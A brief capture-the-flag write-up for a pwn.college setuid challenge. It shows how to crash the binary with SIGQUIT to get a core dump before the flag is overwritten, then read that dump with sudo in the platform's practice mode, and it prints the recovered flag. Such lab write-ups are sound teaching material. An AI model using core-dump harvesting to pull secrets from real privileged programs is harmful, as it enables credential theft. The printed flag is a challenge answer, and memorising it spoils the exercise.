> the claus binary is setuid and it reads /flag into memory. after that, it slowly overwrites the flag with # characters (there’s a sleep(1) between each overwrite).
> problem is, the core dump it generates is only readable by root.

### key idea
- there are basically two things you need to figure out:
- crash the program before the flag gets overwritten
- somehow read the core dump even though it’s root-only → that’s where pwn.college privileged mode comes in
```
ubuntu@2025~day-02:~$ ulimit -c 8192
ubuntu@2025~day-02:~$ /challenge/claus
🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!
On, Comet! on Cupid! on, Donder and Blitzen!

^\Quit (core dumped)
ubuntu@2025~day-02:~$ 
```
- now in privileged mode
```
ubuntu@practice~2025~day-02:~$ sudo strings coal | grep pwn
pwn.college{cCg9kn_Gipu9jiYS8Q7Bd6o4sIx.0FO3gTMywSMwEzNzEzW}
ubuntu@practice~2025~day-02:~$ 
```
